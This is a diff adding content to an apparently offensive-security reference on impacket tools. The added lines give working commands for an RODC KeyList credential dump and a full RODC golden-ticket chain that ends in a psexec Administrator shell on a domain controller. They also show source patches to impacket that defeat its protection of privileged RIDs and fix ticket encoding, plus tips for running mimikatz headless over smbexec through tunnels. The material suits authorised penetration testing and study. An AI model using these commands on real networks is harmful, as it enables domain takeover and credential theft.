@@ -50,6 +50,19 @@ script.py //TARGET -no-pass
 
 ### secretsdump.py
 
+> **RODC KeyList mode** — extract credentials from the writable DC via the RODC's krbtgt key. kvno encoding and PRP prerequisites: `active-directory-technique/references/rodc-attacks.md`.
+
+```bash
+# KeyList attack: auth as RODC machine account, forge partial TGT with krbtgt_XXXXX key
+secretsdump.py -use-keylist -rodcNo XXXXX -rodcKey <krbtgt_XXXXX_aes256> \
+  'DOMAIN/RODC01$:password@DC01.DOMAIN.LOCAL' -dc-ip DC_IP
+```
+
+**impacket-specific patches** (source patches, not the general kvno rule above):
+- `getAllowedUsersToReplicate()` hardcodes deny for RIDs 500-503. Patch to force specific targets: replace `return targetList` with `return ['Administrator:500']`.
+- `createPartialTGT()` defaults kvno to `self.__keyVersionNumber << 16` (kvno_low = 0) — patch to the correct encoding if `-rodcNo` support is unavailable.
+- RC4-only partial TGTs fail with `KRB_AP_ERR_BAD_INTEGRITY` if domain disabled RC4. Patch etype to `aes256_cts_hmac_sha1_96` and session key length to 32 bytes.
+
 Dump NTDS.dit (remote or local), SAM, LSA secrets, cached credentials.
 
 ```bash
@@ -224,6 +237,9 @@ wmiexec.py DOMAIN/admin:pass@TARGET -shell-type powershell
 
 ### smbexec.py
 
+> **Output capture caveat**: smbexec writes output via a file on the target share. When running over tunnels (chisel, ligolo), output may appear blank. Commands ARE executing — verify by redirecting to a file (`cmd > C:\out.txt 2>&1`) and reading it via SMB.
+> Same applies to mimikatz over smbexec/SCM — no console is allocated, so `> file 2>&1` produces an empty file. Use mimikatz's own `log` command instead; see the `mimikatz` skill's Headless execution section.
+
 Command exec via SMB (no shell, one-shot). Creates temp service per command.
 
 ```bash
@@ -336,6 +352,23 @@ ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain DOMAIN.LOCAL ad
 
 # Silver Ticket (requires service account NTLM hash + SPN)
 ticketer.py -nthash SVC_HASH -domain-sid S-1-5-21-... -domain DOMAIN.LOCAL -spn cifs/TARGET administrator
+
+# RODC Golden Ticket (if -rodcNo flag is available)
+ticketer.py -aesKey KRBTGT_XXXXX_AES256 -domain-sid S-1-5-21-... -domain DOMAIN.LOCAL \
+  -rodcNo XXXXX -user-id 500 -groups '512,520,513,519,518' Administrator
+
+# RODC Golden Ticket (manual kvno patch if -rodcNo not available)
+# Edit ticketer.py: change kdcRep['ticket']['enc-part']['kvno'] = 2
+# to kdcRep['ticket']['enc-part']['kvno'] = (RODC_NUMBER << 16) | kvno_low
+# where kvno_low = msDS-KeyVersionNumber of krbtgt_XXXXX (usually 1)
+ticketer.py -aesKey KRBTGT_XXXXX_AES256 -domain-sid S-1-5-21-... -domain DOMAIN.LOCAL \
+  -user-id 500 -groups '512,520,513,519,518' Administrator
+
+# Then request TGS from the writable DC
+export KRB5CCNAME=Administrator.ccache
+getST.py -spn cifs/DC01.DOMAIN.LOCAL -dc-ip DC_IP -k -no-pass 'DOMAIN.LOCAL/Administrator'
+export KRB5CCNAME=Administrator@cifs_DC01.DOMAIN.LOCAL@DOMAIN.LOCAL.ccache
+psexec.py -k -no-pass DOMAIN.LOCAL/Administrator@DC01.DOMAIN.LOCAL
 
 # Use ticket
 export KRB5CCNAME=administrator.ccache
